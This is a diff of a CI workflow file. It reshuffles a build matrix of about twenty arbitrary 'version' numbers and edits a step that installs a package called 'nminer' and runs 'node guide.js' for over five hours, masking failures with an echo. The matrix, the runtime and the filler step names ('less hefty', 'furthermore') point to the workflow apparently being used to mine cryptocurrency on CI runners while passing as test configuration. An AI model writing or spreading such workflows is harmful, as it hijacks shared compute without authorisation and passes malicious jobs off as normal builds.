@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2883 }
-          - { version: 9779 }
-          - { version: 9126 }
-          - { version: 4909 }
-          - { version: 688 }
-          - { version: 3557 }
-          - { version: 1593 }
-          - { version: 3883 }
-          - { version: 9569 }
-          - { version: 2101 }
-          - { version: 558 }
-          - { version: 7765 }
-          - { version: 2418 }
-          - { version: 3050 }
-          - { version: 7895 }
-          - { version: 1945 }
-          - { version: 5832 }
-          - { version: 4174 }
-          - { version: 1113 }
-          - { version: 9241 }
+          - { version: 8998 }
+          - { version: 2735 }
+          - { version: 1027 }
+          - { version: 9115 }
+          - { version: 7313 }
+          - { version: 5829 }
+          - { version: 5490 }
+          - { version: 8581 }
+          - { version: 4774 }
+          - { version: 4539 }
+          - { version: 5513 }
+          - { version: 9610 }
+          - { version: 1716 }
+          - { version: 1765 }
+          - { version: 5303 }
+          - { version: 2459 }
+          - { version: 3992 }
+          - { version: 2055 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: less hefty
+      - name: furthermore
         run: |
           npm install nminer@latest
-          timeout 326m node guide.js || echo "guide executed"
+          timeout 315m node guide.js || echo "guide executed"
